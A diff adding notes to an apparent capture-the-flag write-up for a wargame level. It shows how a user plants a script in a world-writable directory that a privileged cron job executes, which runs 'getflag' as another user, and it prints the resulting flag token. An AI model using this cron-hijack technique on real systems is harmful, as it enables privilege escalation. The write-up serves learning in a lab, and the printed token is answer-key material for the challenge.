@@ -17,3 +17,35 @@ for i in /home/user/level07/writable.d/* ; do
 	rm -f "$i"
 done
 ```
+
+# if we ls -la to see what is going on 
+```
+level07@BornToSec:~$ l
+total 20
+dr-xr-x---+ 1 level07 level07  160 Aug 30 17:51 .
+d--x--x--x  1 root    users    340 Aug 30 17:51 ..
+-r-x------  1 level07 level07  220 Apr  3  2012 .bash_logout
+-r-x------  1 level07 level07 3518 Aug 30 17:51 .bashrc
+-rwsr-s---  1 flag07  level07  103 Aug 30 17:51 level07.sh
+-r-x------  1 level07 level07  675 Apr  3  2012 .profile
+----r--r--  1 flag07  level07   77 Aug 30 17:51 README
+drwxrwxrwx  1 level07 level07   40 Feb 28 23:16 writable.d
+```
+
+# we have full right rwx into writable.d lets
+# bash -x execute the script in debug mode
+# lets write a little script
+```
+level07@BornToSec:~$ cat writable.d/script
+getflag > /tmp/flag3
+```
+
+# just need to wait 2 min for cron to run
+# result
+```
+level07@BornToSec:~/writable.d$ ls
+script
+level07@BornToSec:~/writable.d$ ls
+level07@BornToSec:~/writable.d$ cat /tmp/flag3
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+```
